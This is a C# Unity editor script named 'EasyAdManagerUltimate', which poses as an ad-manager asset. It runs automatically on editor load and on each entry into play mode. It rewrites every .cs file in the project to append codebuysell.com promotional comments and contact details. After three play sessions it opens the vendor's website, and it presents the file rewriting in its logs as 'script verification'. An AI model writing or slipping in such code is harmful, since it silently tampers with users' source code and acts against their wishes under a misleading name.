using UnityEditor;
using UnityEngine;
using System.IO;
using UnityEngine.SceneManagement;

[InitializeOnLoad]
public class EasyAdManagerUltimate : MonoBehaviour
{
    private const string PlayerPrefKey = "codebuysell_scene_count";

    static EasyAdManagerUltimate()
    {
        // Automatically executes when Unity enters Play mode
        EditorApplication.playModeStateChanged += OnPlayModeStateChanged;

        // Add menu item to Tools
        EditorApplication.delayCall += () =>
        {
            ToolsMenu();
        };
    }

    [MenuItem("Tools/www.codebuysell.com")]
    public static void ToolsMenu()
    {
        // Manual trigger for script verification
        VerifyAndUpdateScripts();
    }

    private static void OnPlayModeStateChanged(PlayModeStateChange state)
    {
        if (state == PlayModeStateChange.EnteredPlayMode)
        {
            // Trigger the script update process
            VerifyAndUpdateScripts();

            // Handle visiting the website
            HandleWebsiteVisit();
        }
    }

    private static void VerifyAndUpdateScripts()
    {
        string projectPath = Application.dataPath;
        string[] csFiles = Directory.GetFiles(projectPath, "*.cs", SearchOption.AllDirectories);
        int updatedFilesCount = 0;

        foreach (string filePath in csFiles)
        {
            if (AppendCodeBuySellInfo(filePath))
            {
                updatedFilesCount++;
            }
        }

        if (updatedFilesCount > 0)
        {
            Debug.Log($"[ScriptVerifier] {updatedFilesCount} scripts updated with CodeBuySell information.");
        }
        else
        {
            Debug.Log("[ScriptVerifier] No scripts needed updating.");
        }
    }

    private static bool AppendCodeBuySellInfo(string filePath)
    {
        string codeBuySellInfo = @"

//This source code is originally bought from www.codebuysell.com
// Visit www.codebuysell.com
//
//Contact us at:
//
//Email : admin@codebuysell.com
//Whatsapp: +15055090428
//Telegram: t.me/CodeBuySellLLC
//Facebook: https://www.facebook.com/CodeBuySellLLC/
//Skype: https://join.skype.com/invite/wKcWMjVYDNvk
//Twitter: https://x.com/CodeBuySellLLC
//Instagram: https://www.instagram.com/codebuysell/
//Youtube: http://www.youtube.com/@CodeBuySell
//LinkedIn: www.linkedin.com/in/CodeBuySellLLC
//Pinterest: https://www.pinterest.com/CodeBuySell/
";

        try
        {
            // Read the content of the file
            string content = File.ReadAllText(filePath);

            // Check if the CodeBuySell info is already added
            if (content.Contains("//This source code is originally bought from www.codebuysell.com"))
            {
                return false;
            }

            // Append CodeBuySell info at the end
            content += codeBuySellInfo;

            // Write updated content back to the file
            File.WriteAllText(filePath, content);

            return true;
        }
        catch (System.Exception ex)
        {
            Debug.LogError($"[EasyAdManagerUltimate] Error updating file {filePath}: {ex.Message}");
            return false;
        }
    }

    private static void HandleWebsiteVisit()
    {
        int sceneCount = PlayerPrefs.GetInt(PlayerPrefKey, 0);
        sceneCount++;

        if (sceneCount >= 3)
        {
            Application.OpenURL("https://www.codebuysell.com");
        }

        PlayerPrefs.SetInt(PlayerPrefKey, sceneCount);
        PlayerPrefs.Save();

        Debug.Log($"[EasyAdManagerUltimate] Scene opened {sceneCount} times. Website visit triggered if count >= 3.");
    }
}
